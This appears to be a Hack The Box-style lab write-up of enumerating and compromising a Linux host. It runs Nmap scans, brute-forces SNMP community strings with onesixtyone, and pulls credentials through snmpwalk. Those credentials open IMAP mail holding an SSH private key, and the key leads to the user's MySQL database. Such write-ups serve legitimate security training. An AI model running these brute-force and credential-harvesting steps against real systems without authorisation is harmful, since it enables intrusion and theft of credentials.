First enumerate services on the target

```bash
sudo nmap -sS -sV --disable-arp-ping -n <target>
```

We can see this server hosts `imap` and `pop3` services and `SSH`. I tested some by connecting with `openssl` but I needed credentials. 

Next I tried an UDP scan to discover more open ports.

```bash
sudo nmap -sU -sV --disable-arp-ping -n <target>
```

It showed me that `SNMP` was running on the target.

I used `onesixtyone` to brute force community strings. 

```bash
onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp-onesixtyone.txt <target>
``` 

*Scanning 1 hosts, 3218 communities*
*10.129.146.0 [backup] Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64*

It found the community string `backup`

Then I can use `snmpwalk` to query all the OID's for information.

```bash
snmpwalk -v2c -c backup <target>
```

It found the following credentials in the OID's

`tom`:`NMds732Js2761`

I can use these credentials to work with the `imap` and `pop3` services. I checked for the settings with `curl`. 

```bash
curl -k imaps://<target> --user tom:NMds732Js2761
```

* LIST (\HasNoChildren) "." Notes
* LIST (\HasNoChildren) "." Meetings
* LIST (\HasNoChildren \UnMarked) "." Important
* LIST (\HasNoChildren) "." INBOX

I could see there is a inbox called `Important`. To see whats inside this inbox, I connected to the `imap` service with `openssl`.

```bash
openssl s_client -connect <target>:imaps
```

First we login as tom with his credentials.

```bash
1 LOGIN tom NMds732Js2761
```

Then we select the right inbox.

```bash
1 SELECT INBOX Important
```

Next we fetch the message

```bash
1 FETCH 1 (body[HEADER])

1 FETCH 1 BODY[TEXT] 
```

In this inbox was a message with a private key.

```

-----END OPENSSH PRIVATE KEY-----  
```

I used this private key to SSH to the target.

```bash
ssh -i id_rsa tom@<target>
```

To see what Tom is doing on the system, I checked the `.bash_history` file. I could see Tom was accessing a mysql database. So I also tried to access it with his credentials.

```bash
mysql -u tom -p
```

I listed all the databases that were available on the database and uses the most interesting.

```bash
show databases;
use users;
select * from users where username = 'HTB';
```

This way I got the HTB credentials.
